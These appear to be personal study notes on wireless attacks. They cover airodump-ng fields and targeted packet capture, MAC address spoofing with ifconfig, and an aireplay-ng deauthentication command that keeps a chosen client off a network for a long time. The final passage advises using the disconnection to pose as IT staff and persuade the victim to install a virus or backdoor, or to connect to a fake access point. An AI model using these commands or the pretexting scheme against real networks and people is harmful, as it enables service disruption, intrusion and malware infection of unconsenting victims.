Packet Sniffing:

#airodump-ng wlan0 (discovering all wireless networks)

BSSID: The MAC address of the target network
PWR: Signal Power of the network, the higher value the better signal we have so -52 better than -58
Beacons: These are frames sent by the network in order to broadcast its existence, so every network even if it's set to be hidden always sends these type of frames basically broadcast
#Data:These are the useful packets
#/s: number of data packets that we collected
CH:channel that the network works on
MB:Maximum speed supported by the network
ENC:The Encryption used by the network
CIPHER:is the cipher used in the network
AUTH: authentication

Targeted Packet Sniffing:
#airodump-ng --bssid 58:7F:66:3F:61:E0 --channel 9 --write test wlan0

Deauthentication Attack:

-->Disconnect any client from any network
USE:
aireplay-ng --deauth 100000000 -a 58:7F:66:3F:61:E0 -c 54:35:30:8A:C9:DB wlan0
(100000000 these are packets that will keep sending to router and the target device therefore i'll disconnect my target device for a very long period of time)


if we want to change the mac address:

#ifconfig wlan0 down (to disable network adapter)
#ifconfig wlan0 hw ether 00:11:22:33:44:55 (change to this mac address)
#ifconfig wlan0 up (to enable adapter again)

-->Disconnect any client from any network

USE:

Deauthentication Attack: it's very useful in social engineering cases where you could disconnect clients from the target network and then call the user and pretend to be a person from the IT department and ask them to install a virus or a backdoor telling them that this would fix their issue, you could also create a fake access point(router) and get them to connect to it
